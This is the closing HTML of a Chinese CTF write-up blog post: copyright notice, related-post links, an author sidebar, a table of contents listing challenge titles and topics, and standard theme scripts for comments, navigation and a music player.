+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://FighterGodNemo.github.io">琉璃幻彩</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://fightergodnemo.github.io/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/">https://fightergodnemo.github.io/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://FighterGodNemo.github.io" target="_blank">琉璃幻彩的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/NSSCTF/">NSSCTF</a><a class="post-meta__tags" href="/tags/%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF/">五题积累</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.staticfile.org/butterfly-extsrc/1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.staticfile.org/butterfly-extsrc/1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E5%85%AD%EF%BC%89/" title="NSSCTF五题积累（六）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">NSSCTF五题积累（六）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[羊城杯 2020]Simple#RSA #Crypto123456789101112131415161718192021222324252627282930313233343536373839404142434...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%BA%8C%EF%BC%89/" title="NSSCTF五题积累（二）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">NSSCTF五题积累（二）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[强网拟态_2021]拟态签到题ZmxhZ3tHYXFZN0t0RXRyVklYMVE1b1A1aUVCUkNZWEVBeThyVH0&#x3D; flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXE...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%80%EF%BC%89/" title="NSSCTF五题积累（一）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">NSSCTF五题积累（一）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[CryptoCTF_2020]One_Line_Crypto 1234567from Crypto.Util.number import *from secret import m, n, x, y, flag...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E5%9B%9B%EF%BC%89/" title="NSSCTF五题积累（四）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">NSSCTF五题积累（四）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[TCTF 2019]babyrsa#AMM #Crypto #RSARSA challs are always easy, right? Even if N is not a integer. 2.Web[鹤城...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%BA%94%EF%BC%89/" title="NSSCTF五题积累（五）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">NSSCTF五题积累（五）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[LitCTF 2023]Hex？Hex！(初级)#古典密码 #Base家族 #其他题目描述: 如果你也和我一样知道hex的话，那我觉得，这件事，太酷啦！  4c69744354467b7461693131316...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%89%EF%BC%89/" title="NSSCTF五题积累（三）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">NSSCTF五题积累（三）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[鹤城杯 2021]easy_crypto#古典密码 #词频分析 公正公正公正诚信文明公正民主公正法治法治诚信民主自由敬业公正友善公正平等平等法治民主平等平等和谐敬业自由诚信平等和谐平等公正法治法治平等平等爱国和...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%BA%8C%EF%BC%89/" title="NSSCTF五题积累（二）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">NSSCTF五题积累（二）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[强网拟态_2021]拟态签到题ZmxhZ3tHYXFZN0t0RXRyVklYMVE1b1A1aUVCUkNZWEVBeThyVH0&#x3D; flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXE...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E5%85%AD%EF%BC%89/" title="NSSCTF五题积累（六）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">NSSCTF五题积累（六）</div></div><div class="info-2"><div class="info-item-1">第一轮1.Crypto[羊城杯 2020]Simple#RSA #Crypto123456789101112131415161718192021222324252627282930313233343536373839404142434...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">琉璃幻彩</div><div class="author-info-description">The Greatest Magician!</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">149</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">164</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">37</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FighterGodNemo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/FighterGodNemo" title="Github" target="_blank"><i class="fab fa-github"></i></a><div class="qr-code-wrapper"><a class="social-icon" href="javascript:void(0)" title="微信"><i class="fab fa-weixin"></i></a><div class="qr-code-popup"><img src="/img/qrcode/wechat-qr.png" alt="微信二维码"/ loading='lazy'></div></div><div class="qr-code-wrapper"><a class="social-icon" href="javascript:void(0)" title="QQ"><i class="fab fa-qq"></i></a><div class="qr-code-popup"><img src="/img/qrcode/qq-qr.png" alt="QQ二维码"/ loading='lazy'></div></div><div class="copy-text-wrapper"><a class="social-icon" href="javascript:void(0)" title="Steam好友代码：1905706957" data-copy-text="1905706957"><i class="fab fa-steam"></i></a><div class="copy-text-popup"><h3>Steam好友代码</h3><p>1905706957</p><p class="copy-hint">点击图标复制</p></div></div><a class="social-icon" href="mailto:guliujia2233@outlook.com" title="Email" target="_blank"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">热爱 CTF 和 Forensic 的网安人一枚～
+欢迎各位大佬交流点评！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E8%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">第一轮</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Crypto"><span class="toc-number">1.1.</span> <span class="toc-text">1.Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2020-encode"><span class="toc-number">1.1.1.</span> <span class="toc-text">[BJDCTF 2020]encode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64-RC4-XOR"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">#Base64 #RC4 #XOR</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Web"><span class="toc-number">1.2.</span> <span class="toc-text">2.Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-caidao"><span class="toc-number">1.2.1.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]caidao</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RCEPHP-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">#RCEPHP #信息收集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Misc"><span class="toc-number">1.3.</span> <span class="toc-text">3.Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NSSRound-V-Team-%E7%94%BB%E5%87%BA%E4%B8%80%E4%B8%AAflag"><span class="toc-number">1.3.1.</span> <span class="toc-text">[NSSRound#V Team]画出一个flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LSB-MISC-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">#LSB #MISC #图片隐写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Pwn"><span class="toc-number">1.4.</span> <span class="toc-text">4.Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF-2020-getshell2"><span class="toc-number">1.4.1.</span> <span class="toc-text">[WUSTCTF 2020]getshell2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA-ret2syscall-%E6%A0%88"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">#栈溢出 #ret2syscall #栈</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Reverse"><span class="toc-number">1.5.</span> <span class="toc-text">5.Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2020-Easy"><span class="toc-number">1.5.1.</span> <span class="toc-text">[BJDCTF_2020]Easy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E8%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">第二轮</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Crypto-1"><span class="toc-number">2.1.</span> <span class="toc-text">1.Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CryptoCTF-2020-One-Line-Crypto"><span class="toc-number">2.1.1.</span> <span class="toc-text">[CryptoCTF_2020]One_Line_Crypto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Web-1"><span class="toc-number">2.2.</span> <span class="toc-text">2.Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP"><span class="toc-number">2.2.1.</span> <span class="toc-text">[第五空间 2021]WebFTP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-git%E6%B3%84%E9%9C%B2"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">#目录扫描 #信息收集 #.git泄露</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">基础测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.</span> <span class="toc-text">找数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%BE%E8%A1%A8"><span class="toc-number">5.</span> <span class="toc-text">找表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9C%8B%E7%BB%93%E6%9E%84"><span class="toc-number">6.</span> <span class="toc-text">看结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">7.</span> <span class="toc-text">获取数据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Misc-1"><span class="toc-number">7.1.</span> <span class="toc-text">3.Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%87%E5%89%91%E6%9D%AF-2021-%E7%AD%BE%E5%88%B0"><span class="toc-number">7.1.1.</span> <span class="toc-text">[陇剑杯_2021]签到</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Pwn-1"><span class="toc-number">7.2.</span> <span class="toc-text">4.Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF-2020-getshell2-1"><span class="toc-number">7.2.1.</span> <span class="toc-text">[WUSTCTF 2020]getshell2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA-ret2syscall-%E6%A0%88-1"><span class="toc-number">7.2.1.1.</span> <span class="toc-text">#栈溢出 #ret2syscall #栈</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Reverse-1"><span class="toc-number">7.3.</span> <span class="toc-text">5.Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SEETF-2022-Magic"><span class="toc-number">7.3.1.</span> <span class="toc-text">[SEETF 2022]Magic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95-REVERSE"><span class="toc-number">7.3.1.1.</span> <span class="toc-text">#反调试 #REVERSE</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E9%A2%98"><span class="toc-number">8.</span> <span class="toc-text">补充题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto%E8%A1%A5%E5%85%85"><span class="toc-number">8.1.</span> <span class="toc-text">Crypto补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-A-CRYPTO"><span class="toc-number">8.1.1.</span> <span class="toc-text">[鹤城杯 2021]A_CRYPTO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E8%A1%A5%E5%85%85"><span class="toc-number">8.2.</span> <span class="toc-text">Web补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">8.2.1.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%90%8E%E7%AB%AF%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-number">8.2.1.1.</span> <span class="toc-text">#SQL注入 #堆叠注入 #后端逻辑分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">8.2.1.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">8.2.1.3.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E6%B3%95%EF%BC%88%E6%9C%80%E7%AE%80%E5%8D%95%EF%BC%89"><span class="toc-number">8.2.1.4.</span> <span class="toc-text">非预期解法（最简单）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95"><span class="toc-number">8.2.1.5.</span> <span class="toc-text">另一种解法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8-sqlmap"><span class="toc-number">8.2.1.6.</span> <span class="toc-text">关于使用 sqlmap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FSQL-%EF%BC%81%E6%B3%A8%E4%B8%80%E4%B8%8B-%EF%BC%81"><span class="toc-number">8.2.2.</span> <span class="toc-text">[LitCTF 2023]这是什么？SQL ！注一下 ！</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/11/%E5%8D%9A%E8%A7%88%E7%9F%A5%E8%AF%86/%E5%93%B2%E5%AD%A6%E4%B8%8E%E7%94%9F%E7%89%A9/%E6%97%A5%E6%9C%AC%E6%96%87%E5%8C%96%E6%B7%B1%E5%BA%A6%E7%A0%94%E7%A9%B6_%E8%AF%BB%E7%A9%BA%E6%B0%94%E4%B8%8E%E6%B2%89%E9%BB%98%E7%9A%84%E6%9A%B4%E5%8A%9B/" title="无标题">无标题</a><time datetime="2026-08-11T11:20:17.772Z" title="更新于 2026-08-11 19:20:17">2026-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/10/%E5%8D%9A%E8%A7%88%E7%9F%A5%E8%AF%86/%E5%93%B2%E5%AD%A6%E4%B8%8E%E7%94%9F%E7%89%A9/%E6%84%9F%E6%83%85%E6%80%9D%E6%83%B3%E4%B8%8E%E4%BA%BA%E6%80%A7%E6%B4%9E%E5%AF%9F%E6%B5%85%E8%B0%88/" title="无标题">无标题</a><time datetime="2026-08-10T12:11:00.000Z" title="更新于 2026-08-10 20:11:00">2026-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/02/%E5%8D%9A%E8%A7%88%E7%9F%A5%E8%AF%86/%E5%93%B2%E5%AD%A6%E4%B8%8E%E7%94%9F%E7%89%A9/%E6%B2%89%E6%B2%A1%E6%88%90%E6%9C%AC%E4%B8%8D%E5%8F%82%E4%B8%8E%E9%87%8D%E5%A4%A7%E5%86%B3%E7%AD%96-%E6%B7%B1%E5%BA%A6%E8%B0%83%E7%A0%94/" title="无标题">无标题</a><time datetime="2026-08-10T12:11:00.000Z" title="更新于 2026-08-10 20:11:00">2026-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/10/%E6%B8%B8%E6%88%8FGame/CS2%E8%81%8C%E4%B8%9A%E9%80%89%E6%89%8B%E9%BC%A0%E6%A0%87%E7%81%B5%E6%95%8F%E5%BA%A6%E9%85%8D%E7%BD%AE%E6%8A%A5%E5%91%8A/" title="无标题">无标题</a><time datetime="2026-08-10T12:02:00.000Z" title="更新于 2026-08-10 20:02:00">2026-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/10/%E5%8D%9A%E8%A7%88%E7%9F%A5%E8%AF%86/%E5%93%B2%E5%AD%A6%E4%B8%8E%E7%94%9F%E7%89%A9/%E5%A4%96%E8%83%9A%E5%9E%8B%E4%BD%93%E8%B4%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/" title="无标题">无标题</a><time datetime="2026-08-10T12:00:00.000Z" title="更新于 2026-08-10 20:00:00">2026-08-10</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 琉璃幻彩</span><span class="framework-info"><span id="busuanzi_container_site_pv">本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</span><span class="footer-separator">|</span><span id="busuanzi_container_site_uv">本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</span></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+  const getUtterancesTheme = theme => theme === 'dark' ? 'photon-dark' : 'github-light'
+
+  const loadUtterances = (el = document, key) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyUtterances = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const config = {
+      src: 'https://utteranc.es/client.js',
+      repo: 'FighterGodNemo/FighterGodNemo.github.io',
+      theme: getUtterancesTheme(document.documentElement.getAttribute('data-theme')),
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      'issue-term': isShuoshuo ? key : (option && option['issue-term']) || 'pathname'
+    }
+
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => ele.setAttribute(key, value))
+    el.querySelector('#utterances-wrap').appendChild(ele)
+  }
+
+  const changeUtterancesTheme = theme => {
+    const iframe = document.querySelector('#utterances-wrap iframe')
+    if (iframe) {
+      const message = {
+        type: 'set-theme',
+        theme: getUtterancesTheme(theme)
+      };
+      iframe.contentWindow.postMessage(message, 'https://utteranc.es')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeUtterancesTheme, 'utterances')
+
+  if (isShuoshuo) {
+    'Utterances' === 'Utterances'
+      ? window.shuoshuoComment = { loadComment: loadUtterances }
+      : window.loadOtherComment = loadUtterances
+    return
+  }
+  
+  if ('Utterances' === 'Utterances' || !false) {
+    if (false) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
+    else loadUtterances()
+  } else {
+    window.loadOtherComment = loadUtterances
+  }
+})()</script></div><script src="/js/custom.js?v=20260402-2"></script><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bootcdn.net/ajax/libs/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.staticfile.org/butterfly-extsrc/1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.staticfile.org/pjax/0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:description\"]","link[rel=\"canonical\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      false
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
